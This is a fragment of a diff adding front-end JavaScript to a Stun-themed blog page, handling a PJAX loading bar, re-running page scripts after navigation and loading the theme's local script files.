+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
